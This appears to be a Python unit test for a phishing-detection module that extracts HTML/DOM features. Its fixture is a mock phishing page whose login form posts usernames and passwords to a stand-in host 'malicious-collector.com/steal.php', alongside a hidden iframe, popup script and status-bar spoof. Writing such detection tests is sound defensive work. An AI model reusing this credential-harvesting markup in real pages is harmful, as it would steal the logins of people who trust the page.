"""
Unit tests for HTML/DOM feature extraction.
"""
import sys
from pathlib import Path
from bs4 import BeautifulSoup

PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from feature_extraction.html_features import (
    extract_html_features_from_soup,
    extract_html_features
)

def test_html_dom_extraction():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Account Verification</title>
        <link rel="icon" href="https://external-cdn.com/favicon.ico">
    </head>
    <body>
        <form action="http://malicious-collector.com/steal.php" method="POST">
            <input type="text" name="user">
            <input type="password" name="password">
            <button type="submit">Submit</button>
        </form>
        <a href="http://external-site.org">Link 1</a>
        <a href="https://another-external.com">Link 2</a>
        <img src="https://image-host.com/fake.png">
        <script>
            window.status = "Protected";
            window.open("popup.html");
        </script>
        <iframe src="hidden.html" style="display:none"></iframe>
    </body>
    </html>
    """
    soup = BeautifulSoup(html, "html.parser")
    feats = extract_html_features_from_soup(soup, "https://mybank.com/portal")
    
    assert feats["ExtFavicon"] == 1.0
    assert feats["ExtFormAction"] == 1.0
    assert feats["InsecureForms"] == 1.0
    assert feats["PctExtHyperlinks"] == 1.0
    assert feats["PctExtResourceUrls"] == 1.0
    assert feats["FakeLinkInStatusBar"] == 1.0
    assert feats["PopUpWindow"] == 1.0
    assert feats["IframeOrFrame"] == 1.0
    assert feats["MissingTitle"] == 0.0
